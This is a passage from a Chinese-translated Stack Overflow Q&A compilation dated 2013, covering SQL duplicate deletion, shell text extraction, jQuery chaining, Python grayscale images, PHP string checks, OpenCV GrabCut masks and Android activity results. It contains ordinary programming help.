   (select  fileid, first, last, amt, filldate             
    from yourtable
    where fileid in (4028, 2090)
    group by first, last, amt, filldate
    having count(1) > 1) as duplicates
   on (duplicates.first = a.first
   and duplicates.last = a.last
   and duplicates.amt = a.amt
   and duplicates.filldate = a.filldate)
   ; 
```

即使没有定义要删除的文件ID，这也会删除所有重复项：

```
delete * from yourtable a
   inner join 
   (select  min(id) minid, first, last, amt, filldate             
    from yourtable
    group by first, last, amt, filldate
    having count(1) > 1) as duplicates
   on (duplicates.first = a.first
   and duplicates.last = a.last
   and duplicates.amt = a.amt
   and duplicates.filldate = a.filldate
   and duplicates.minid <> a.id)
   ; 
```

# linux - 用于从另一个文件的块组成文件的 shell 命令

> ID：14111700
> 
> 赞同：3
> 
> 时间：2013-01-01T15:31:58.097
> 
> 标签：linux, bash, shell, unix, scripting

我有一个数据文件和一个包含位置列表的文件，我想从数据文件的块中生成一个文件。例子：

```
$ cat data
abcdefghijkl
$ cat positions
0,2
5,8
$ cutter positions data
abcfghi 
```

是否有一个（linux）shell 命令可以像我假设的“切割器”一样工作？“位置”的特定格式并不重要。我们可以假设“位置”中指定的块按递增顺序排列并且不重叠。可能还有一个额外的“切割器”模式，其中位置计数行而不是字节。

我可以自己轻松实现这样的程序，但我有直觉认为这样的程序已经存在。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-01T16:56:43.653

只需使用 bash 从参数扩展中提取子字符串，并使用`positions`给定的文件格式：

```
data=$(< data)    # read the entire file into a variable
while IFS=, read start stop; do
    printf "%s" "${data:$start:((stop-start+1))}"
done < positions
echo 
```

输出

```
abcfghi 
```

如果您的数据文件跨越多行，则必须注意位置文件以考虑换行符。

此方法不需要您将数据文件读入内存：

```
#!/bin/bash
exec 3<data
exec 4<positions
pos=0
while IFS=, read start stop <&4; do
    ((nskip = start - pos))
    ((nkeep = stop - start + 1))
    ((pos += nskip + nkeep))
    ((nskip > 0)) && read -N $nskip <&3
    read -N $nkeep <&3
    printf "%s" "$REPLY"
done
echo 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-01T17:15:12.560

`cut -c`将允许您指定固定宽度的列，这似乎是您正在寻找的：

```
$ echo "abcdefghijkl" | cut -c 1-3,6-9
abcfghi 
```

请注意，字符位置从 1 而不是 0 开始。可以使用逗号指定各个列，例如`cut -c 1,3,5,7`，或者可以使用破折号指定范围：`cut -c 2-8`

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-01T15:56:54.643

这可以通过添加命令替换来完成，`cut`正如[Barton Chittenden](https://stackoverflow.com/questions/14111700/a-shell-command-for-composing-a-file-from-chunks-of-another-file/14112461#14112461)指出的那样：

```
$ cut -c $(cat positions) data
abcfghi 
```

> “位置”的特定格式并不重要。

我按照预期制作了职位格式，`cut`因此不需要额外的处理。

```
$ cat data
abcdefghijkl

$ cat positions
1-3,6-9 
```

* * *

您可以通过在文件中`cutter`添加一个[函数来将其转换为命令](http://tldp.org/LDP/abs/html/functions.html)`~/.bashrc`

```
function cutter ()
{
     $ cut -c $(cat "$1") "$2"
} 
```

然后运行`source ~/.bashrc`就可以`cutter`根据需要使用了：

```
$ cutter positions data
abcfghi 
```

使用重定向将输出存储在`newfile`：

```
$ cut -c $(cat positions) data > newfile

$ cutter positions data > newfile 
```

# jquery - 为什么链接 .andSelf() 不起作用？

> ID：14111702
> 
> 赞同：0
> 
> 时间：2013-01-01T15:32:26.520
> 
> 标签：jquery

这是解释问题的jsfiddle，[http://jsfiddle.net/4CuqR/](http://jsfiddle.net/4CuqR/)

在这里复制粘贴相同的小提琴代码。

```
<!DOCTYPE html>
<html>
<head>
  <style type="text/css">
    p,div { margin: 0; padding: 0; padding-left: 20px; }
  </style>  
</head>
<html>
<body>
  <DIV class="main">
    <span>Main Class</span>
    <DIV class="sub1">
      <span>sub1 Class</span>
      <p>Hello P1</p>
      <p>Hello P2</p>
    </DIV>
  </DIV>
</body>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.min.js"></script>
  <script>
  $(function() {
      $('.main').children('.sub1').children('p:first').andSelf().andSelf().css("color", "red");
  });​
  </script>
</html> 
```

在上面的代码中，理想情况下**DIV.main**也应该是红色的。

这是**上面代码的输出**。

![在此处输入图像描述](../Images/5711d08d6be8228106f51beefa198bc8.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T15:34:56.777

移动你`.andSelf()`的 s：

```
$('.main').children('.sub1').andSelf().children('p:first').andSelf().css("color","red");​ 
```

**演示：http: [//jsfiddle.net/4CuqR/2/](http://jsfiddle.net/4CuqR/2/)**。

这是一个相当复杂的选择器。

*   第一个`.andSelf()`选择：

    ```
     $('.main').children('.sub1')
    + $('.main') 
    ```

*   然后第二个`.andSelf()`添加：

    ```
     $('.main').children('.sub1').andSelf().children('p:first')
    + $('.main').children('.sub1')
    + $('.main') 
    ```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T15:54:19.450

好吧，让我解释一下……

您的代码如下

```
$('.main').children('.sub1').children('p:first') 
```

给你元素

```
<p>Hello P1</p> 
```

现在，当您添加第一个时`.andSelf()`，它会为您提供元素

```
<DIV class="sub1">
  <span>sub1 Class</span>
  <p>Hello P1</p>
  <p>Hello P2</p>
</DIV> 
```

接下来，当您添加第二个时`.andSelf()`，它仍然为您提供相同的元素

```
<DIV class="sub1">
  <span>sub1 Class</span>
  <p>Hello P1</p>
  <p>Hello P2</p>
</DIV> 
```

因此，您的代码不起作用，并且**DIV.main**不是红色的。

所以，试试这个：

```
$('.main').children('.sub1').andSelf().children('p:first').andSelf().css("color","red"); 
```

这也将选择**DIV.main**并添加 css。

这里是下面的代码

```
$('.main').children('.sub1').andSelf() 
```

为我们提供以下元素

```
<DIV class="main">
   <span>Main Class</span>
   <DIV class="sub1">
      <span>sub1 Class</span>
      <p>Hello P1</p>
      <p>Hello P2</p>
   </DIV>
</DIV>​ 
```

接下来，当您添加第二个时`.andSelf()`，它仍然为您提供相同的元素

```
<DIV class="main">
   <span>Main Class</span>
   <DIV class="sub1">
      <span>sub1 Class</span>
      <p>Hello P1</p>
      <p>Hello P2</p>
   </DIV>
</DIV>​ 
```

# python - 显示灰度图像

> ID：14111705
> 
> 赞同：5
> 
> 时间：2013-01-01T15:32:31.373
> 
> 标签：python, matplotlib, python-imaging-library

我的目标：

1.  将图像读入 PIL 格式。
2.  将其转换为灰度。
3.  使用 pylab 绘制图像。

这是我正在使用的代码：

```
from PIL import Image
from pylab import *
import numpy as np

inputImage='C:\Test\Test1.jpg'
##outputImage='C:\Test\Output\Test1.jpg'

pilImage=Image.open(inputImage)
pilImage.draft('L',(500,500))
imageArray= np.asarray(pilImage)

imshow(imageArray)

##pilImage.save(outputImage)

axis('off')

show() 
```

我的问题：图像的显示就像颜色反转一样。

![这是原始图像](../Images/48d89c69a018dac7d1d0b3689851fe7e.png)

![这是它在 Python 窗口中的显示方式](../Images/43057e844e88094c62c29ff9d8d55b30.png)

但是我知道图像正在转换为灰度，因为当我将其写入磁盘时，它显示为灰度图像。（正如我所料）。

我觉得问题出在numpy转换的某个地方。

我刚刚开始使用 Python 进行图像处理编程。提示和指南也将不胜感激。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-01-01T15:41:23.910

您想覆盖默认颜色图：

```
imshow(imageArray, cmap="Greys_r") 
```

[这是有关在 matplotlib 中绘制图像和伪色的页面](http://matplotlib.org/users/image_tutorial.html)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T16:43:39.317

这会产生一个黑白图像：

```
pilImage=Image.open(inputImage)
pilImage = pilImage.convert('1')   #this convert to black&white
pilImage.draft('L',(500,500))

pilImage.save('outfile.png') 
```

从`convert`方法[文档](http://www.pythonware.com/library/pil/handbook/image.htm)：

```
convert

im.convert(mode) => image

Returns a converted copy of an image.
When translating from a palette image, this translates pixels through the palette.
If mode is omitted, a mode is chosen so that all information in the image and the palette can be represented without a palette.

When from a colour image to black and white, the library uses the ITU-R 601-2 luma transform:

    L = R * 299/1000 + G * 587/1000 + B * 114/1000
When converting to a bilevel image (mode "1"), the source image is first converted to black and white.
Resulting values larger than 127 are then set to white, and the image is dithered.
To use other thresholds, use the point method. 
```

# php - 检查字符串是否完全没有字符或数字

> ID：14111706
> 
> 赞同：0
> 
> 时间：2013-01-01T15:32:31.793
> 
> 标签：php

在 php 中，如何检查字符串是否完全没有字符。

目前我喜欢下面，并替换`-`为`' '`. 但是，如果搜索字符串包含所有坏词，它会给我留下`' '`（3 个空格）。长度仍将显示为 3，它会转到 sql 处理器。有什么方法可以检查字符串是否根本没有字符或数字？

```
$fetch = false;

#$strFromSearchBox = 'Why-you-foo-bar-I-ought-to-tar-you';
$strFromSearchBox = 'foo-bar-tar';

if(strlen($strFromSearchBox) >=2)
{
    $newString = str_replace($theseWords,'',$strFromSearchBox);
    $newString = str_replace('-',' ',$newString);

    if(strlen($newString)>=2)
    {   
        $fetch = true;
        echo $newString;
    }
}

if($fetch){echo 'True';}else{echo 'False';} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-01T15:34:54.713

```
$fetch = false;

#$strFromSearchBox = 'Why-you-foo-bar-I-ought-to-tar-you';
$strFromSearchBox = 'foo-bar-tar';

if(strlen($strFromSearchBox) >=2)
{
    $newString = str_replace($theseWords,'',$strFromSearchBox);
    $newString = str_replace('-',' ',$newString);
    $newString=trim($newString);  //This will make the string 0 length if all are spaces
    if(strlen($newString)>=2)
    {   
        $fetch = true;
        echo $newString;
    }
}

if($fetch){echo 'True';}else{echo 'False';} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T15:36:53.003

如果去掉前导和最后的空格，长度将下降到 0，您可以轻松地将其转换为`$fetch`布尔值：

```
$fetch = (bool) strlen(trim($newString)); 
```

请参阅[`trim`^(*文档*)](http://php.net/trim)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T15:37:51.663

也许使用正则表达式...

```
if (preg_match('/[^A-Za-z0-9]+/', $strFromSearchBox))
{
  //is true that $strFromSearchBox contains letters and/or numbers
} 
```

# opencv - 如何在 OpenCV 中为 GrabCut 设置蒙版图像？

> ID：14111716
> 
> 赞同：4
> 
> 时间：2013-01-01T15:34:47.823
> 
> 标签：opencv, javacv

如何在 OpenCV 中为 grabCut 函数设置蒙版图像？我想用选项做 GC_INIT_WITH_MASK

```
GC_BGD    = 0,
GC_FGD    = 1,
GC_PR_BGD = 2,
GC_PR_FGD = 3, 
```

如果你能用 JavaCV 回答这个问题，那就太好了，因为我在 Scala/Java 中这样做。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-04-13T08:39:08.213

**输入图像**（lena.png、lena_mask.png）：

[![在此处输入图像描述](../Images/c8ba3d42f2e373af8d9d9112ea45d343.png)](https://i.stack.imgur.com/JC30O.png) [![在此处输入图像描述](../Images/9a0c99ebc5a8a85ae6e580c5a0fc70a5.png)](https://i.stack.imgur.com/CVaAw.png)

**代码（JAVA）**：

```
import org.opencv.core.Core;
import org.opencv.core.CvType;
import org.opencv.core.Mat;
import org.opencv.core.Rect;
import org.opencv.core.Scalar;
import org.opencv.highgui.Highgui;
import org.opencv.imgproc.Imgproc;

/**
 * Example how to use grabCut algorithm in OpenCV using GC_INIT_WITH_MASK.
 *
 */
public class ImageSegmentByMask {

    public static void main(String[] args) {
        System.loadLibrary(Core.NATIVE_LIBRARY_NAME);

        // will read image
        Mat image = Highgui.imread("lena.png");
        Mat mask = Highgui.imread("lena_mask.png", Highgui.CV_LOAD_IMAGE_GRAYSCALE);

        Rect rectangle = new Rect(10, 10, image.cols() - 20, image.rows() - 20);

        Mat bgdModel = new Mat(); // extracted features for background
        Mat fgdModel = new Mat(); // extracted features for foreground
        Mat source = new Mat(1, 1, CvType.CV_8U, new Scalar(0));

        convertToOpencvValues(mask); // from human readable values to OpenCV values 

        int iterCount = 1;
        Imgproc.grabCut(image, mask, rectangle, bgdModel, fgdModel, iterCount, Imgproc.GC_INIT_WITH_MASK);

        convertToHumanValues(mask); // back to human readable values
        Imgproc.threshold(mask,mask,128,255,Imgproc.THRESH_TOZERO);

        Mat foreground = new Mat(image.size(), CvType.CV_8UC1, new Scalar(0, 0, 0));
        image.copyTo(foreground, mask);

        Highgui.imwrite("sandbox/sucess1.jpg", foreground);
    }

    private static void convertToHumanValues(Mat mask) {
        byte[] buffer = new byte[3];
        for (int x = 0; x < mask.rows(); x++) {
            for (int y = 0; y < mask.cols(); y++) {
                mask.get(x, y, buffer);
                int value = buffer[0];
                if (value == Imgproc.GC_BGD) {
                    buffer[0] = 0; // for sure background
                } else if (value == Imgproc.GC_PR_BGD) {
                    buffer[0] = 85; // probably background
                } else if (value == Imgproc.GC_PR_FGD) {
                    buffer[0] = (byte) 170; // probably foreground
                } else {
                    buffer[0] = (byte) 255; // for sure foreground

                }
                mask.put(x, y, buffer);
            }
        }
    }

    /**
     * Converts level of grayscale into OpenCV values. White - foreground, Black
     * - background.
     * 
     * @param mask
     */
    private static void convertToOpencvValues(Mat mask) {
        byte[] buffer = new byte[3];
        for (int x = 0; x < mask.rows(); x++) {
            for (int y = 0; y < mask.cols(); y++) {
                mask.get(x, y, buffer);
                int value = buffer[0];
                if (value >= 0 && value < 64) {
                    buffer[0] = Imgproc.GC_BGD; // for sure background
                } else if (value >= 64 && value < 128) {
                    buffer[0] = Imgproc.GC_PR_BGD; // probably background
                } else if (value >= 128 && value < 192) {
                    buffer[0] = Imgproc.GC_PR_FGD; // probably foreground
                } else {
                    buffer[0] = Imgproc.GC_FGD; // for sure foreground

                }
                mask.put(x, y, buffer);
            }
        }

    }

} 
```

**结果**：

[![在此处输入图像描述](../Images/a4b89b9c47a567d7a5645c25bc4abe36.png)](https://i.stack.imgur.com/gTboV.png)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-02T15:12:07.407

OpenCV 中的工作示例：

```
//Fill with the background value
Mat mask = cv::Mat::ones(src.size(), CV_8U) * cv::GC_BGD;

//Fill a smaller rectangle with the probably-foreground value.
Rect area;
area.x=10;  area.y=10;
area.width=250; area.height=250;
rectangle(mask, area , cv::Scalar(cv::GC_PR_FGD),-1,8,0);

//Fill a smaller rectangle with the foreground value.
area.x=50;  area.y=50;
area.width=20;  area.height=20;
rectangle(mask, area , cv::Scalar(cv::GC_FGD),-1,8,0);

Mat bgd,fgd;
cv::grabCut(src, mask, area, bgd, fgd, 1, cv::GC_INIT_WITH_MASK);

//Visualize results.
compare(mask,cv::GC_FGD,mask,cv::CMP_EQ);
Mat foreground(src.size(),CV_8UC3, cv::Scalar(0,0,0));
src.copyTo(foreground,mask);
imshow("segm",foreground); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-05-19T01:44:18.503

```
public class ImageSegment {

    public static void main(String[] args) {
        System.loadLibrary("opencv_java244");

        Mat image = null;
        image = Highgui.imread("syh.jpg");

        Rect rectangle = new Rect(25,25,image.cols()-64,image.rows()-64);
        Mat result = new Mat();
        Mat bgdModel = new Mat();
        Mat fgdModel = new Mat();
        Mat source = new Mat(1, 1, CvType.CV_8U, new Scalar(3));
        Imgproc.grabCut(image, result, rectangle, bgdModel, fgdModel, 1, 0);
        Core.compare(result, source,result, Core.CMP_EQ);
        Mat foreground= new Mat(image.size(), CvType.CV_8UC1, new Scalar(0, 0, 0));
        image.copyTo(foreground, result);
        Highgui.imwrite("sucess1.jpg", foreground);
        System.out.println("grabcut sucess!");
    }

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-01T16:17:12.663

初始图像掩码是 的第二个参数`grabCut`，因此您应该能够创建一个图像，`CvMat.create()`然后将值适当地设置为`GC_BGD, GC_FGC, GC_PR_BGD, GC_PR_FGD`，例如（无法在这台计算机上测试代码）：

```
val mask = cvCreateImage(cvGetSize(image), IPL_DEPTH_8U, 1)
// Set mask pixel values to what you want
mask.put(offset, GC_BGD)
...
grabCut(image, mask, ... <your other options here>) 
```

我对javacv不是最熟悉的，可能有一种很好的方法来设置掩码的范围或块中的值，而不是一次一个像素。

此外，根据以下[文档](http://opencv.willowgarage.com/documentation/cpp/miscellaneous_image_transformations.html)`grabCut`：

> "注意GC_INIT_WITH_RECT和GC_INIT_WITH_MASK是可以组合的，那么ROI以外的所有像素都会自动初始化为GC_BGD"

# android - 安卓 | StartActivityForResult 不会做任何事情

> ID：14111717
> 
> 赞同：1
> 
> 时间：2013-01-01T15:34:52.317
> 
> 标签：android, android-intent, start-activity

我有家庭作业要做，当我在一个新活动中写一个国家（forresult）时，它将把它写在主要活动和我写的颜色中，新活动会将文本颜色更改为我写的内容。但是“确定”和“取消”按钮不会传输任何搜索解决方案的信息但没有成功

主要活动 -

```
public class MainActivity extends Activity implements OnClickListener {
TextView tvDisplayCountry;
Random crazy;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    requestWindowFeature(Window.FEATURE_NO_TITLE);
    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN);
    setContentView(R.layout.activity_main);

    initsialize();

}

private void initsialize() {
    Button bAddCountry = (Button) findViewById(R.id.bAddCountry);
    bAddCountry.setOnClickListener(this);
    tvDisplayCountry = (TextView) findViewById(R.id.tvDisplayCountry);
    // ImageView ivCountryPhoto =
    // (ImageView)findViewById(r.id.ivCountryPhoto);
}

@Override
public void onClick(View v) {

    switch (v.getId()) {

    case R.id.bAddCountry:
        Intent countryactivityIntent = new Intent(MainActivity.this,
                CountryActivity.class);
        startActivityForResult(countryactivityIntent, 12);

        break;
    }

}

@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {

    switch(resultCode){
    case 12:
        if (resultCode == Activity.RESULT_OK) {
            String Country = data.getStringExtra("country");
            String Color = data.getStringExtra("color");
            tvDisplayCountry.setText(Country);
            if (Color.equalsIgnoreCase("blue")) {
                tvDisplayCountry.setTextColor(android.graphics.Color.BLUE);
            } else if (Color.equalsIgnoreCase("yellow")) {
                tvDisplayCountry
                .setTextColor(android.graphics.Color.YELLOW);
            } else if (Color.equalsIgnoreCase("gray")) {
                tvDisplayCountry.setTextColor(android.graphics.Color.GRAY);
            } else if (Color.equalsIgnoreCase("red")) {
                tvDisplayCountry.setTextColor(android.graphics.Color.RED);
            }
            else{
                Toast.makeText(MainActivity.this, "canceld", Toast.LENGTH_SHORT).show();
            }
            break;
        }
    }

    super.onActivityResult(requestCode, resultCode, data);
} 
```

}

国家活动 -

```
public class CountryActivity extends Activity implements OnClickListener {
EditText etCountry, etColor;
String getCountry, getColor;
Button bOk,bCancel;
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    requestWindowFeature(Window.FEATURE_NO_TITLE);
    getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, WindowManager.LayoutParams.FLAG_FULLSCREEN);
    setContentView(R.layout.activity_country);

    init();

}

private void init() {
    etColor = (EditText)findViewById(R.id.etColor);
    etCountry = (EditText)findViewById(R.id.etCountry);
    bOk = (Button)findViewById(R.id.bOk);
    bCancel = (Button)findViewById(R.id.bCancel);
    bOk.setOnClickListener(this);
    bCancel.setOnClickListener(this);

}

@Override
public void onClick(View v) {

    switch (v.getId()) {
    case R.id.bOk:
        Intent myIntet = new Intent();
        getCountry = etCountry.getText().toString();
        myIntet.putExtra("country",getCountry );
        getColor = etColor.getText().toString();
        myIntet.putExtra("color", getColor);

        setResult(Activity.RESULT_OK, myIntet);
        finish();

        break;

    case R.id.bCancel:
        Intent myIntent = new Intent();

        setResult(Activity.RESULT_CANCELED, myIntent);
        finish();
        break;
    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T15:38:59.600

`onActivityResult`您的- 您打开`resultCode`（将是`RESULT_OK`or `RESULT_CANCELED`，not `12`）有一个错误。

只需更改`switch(resultCode)`为`switch(requestCode)`.

# android - ItemizedOverlay 类的覆盖方法被多次调用

> ID：14111724
> 
> 赞同：1
> 
> 时间：2013-01-01T15:35:37.433
> 
> 标签：android, google-maps, itemizedoverlay

我面临一些问题，因为 ItemizedOverlay 类的 createItem(int i) 方法为我在 itemizedOverlay 对象中添加的每个 overlayItem 多次调用。

通过查看我的 logcat 输出，您会得到更好的主意。

```
 01-01 20:51:33.486: I/System.out(690): addOverlay is called
01-01 20:51:33.497: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:33.506: I/System.out(690): addOverlay is called
01-01 20:51:33.517: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:33.526: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:33.536: I/System.out(690): addOverlay is called
01-01 20:51:33.536: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:33.546: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:33.556: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:33.576: I/System.out(690): addOverlay is called
01-01 20:51:33.576: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:33.596: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:33.606: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:33.616: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:33.637: I/System.out(690): addOverlay is called
01-01 20:51:33.637: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:33.657: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:33.676: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:33.696: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:33.708: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:33.726: I/System.out(690): addOverlay is called
01-01 20:51:33.726: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:33.736: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:33.757: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:33.776: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:33.796: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:33.816: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:33.836: I/System.out(690): addOverlay is called
01-01 20:51:33.836: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:33.846: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:33.866: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:33.886: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:33.897: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:33.906: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:33.916: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
01-01 20:51:33.936: I/System.out(690): addOverlay is called
01-01 20:51:33.936: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:33.958: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:33.976: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:33.996: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:34.016: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:34.036: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:34.056: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
01-01 20:51:34.056: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 7
01-01 20:51:34.087: I/System.out(690): addOverlay is called
01-01 20:51:34.087: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:34.096: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:34.106: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:34.127: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:34.146: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:34.166: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:34.176: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
01-01 20:51:34.196: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 7
01-01 20:51:34.206: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 8
01-01 20:51:34.216: I/System.out(690): addOverlay is called
01-01 20:51:34.216: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:34.236: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:34.247: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:34.256: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:34.266: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:34.286: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:34.306: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
01-01 20:51:34.318: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 7
01-01 20:51:34.336: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 8
01-01 20:51:34.346: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 9
01-01 20:51:34.366: I/System.out(690): addOverlay is called
01-01 20:51:34.366: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:34.376: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:34.396: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:34.406: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:34.428: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:34.436: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:34.446: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
01-01 20:51:34.456: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 7
01-01 20:51:34.476: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 8
01-01 20:51:34.496: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 9
01-01 20:51:34.506: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 10
01-01 20:51:34.526: I/System.out(690): addOverlay is called
01-01 20:51:34.526: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:34.536: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:34.556: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:34.566: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:34.586: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:34.606: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:34.616: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
01-01 20:51:34.616: I/dalvikvm(690): Jit: resizing JitTable from 512 to 1024
01-01 20:51:34.706: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 7
01-01 20:51:34.716: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 8
01-01 20:51:34.736: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 9
01-01 20:51:34.756: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 10
01-01 20:51:34.766: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 11
01-01 20:51:34.776: I/System.out(690): addOverlay is called
01-01 20:51:34.786: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:34.796: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:34.816: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:34.828: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:34.846: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:34.856: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:34.876: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
01-01 20:51:34.886: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 7
01-01 20:51:34.906: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 8
01-01 20:51:34.919: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 9
01-01 20:51:34.926: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 10
01-01 20:51:34.936: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 11
01-01 20:51:34.956: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 12
01-01 20:51:34.976: I/System.out(690): addOverlay is called
01-01 20:51:34.976: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 0
01-01 20:51:34.987: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 1
01-01 20:51:35.006: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 2
01-01 20:51:35.026: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 3
01-01 20:51:35.046: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 4
01-01 20:51:35.066: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 5
01-01 20:51:35.076: I/System.out(690): ItemizedOverlayForNearbyLocation createItem() 6
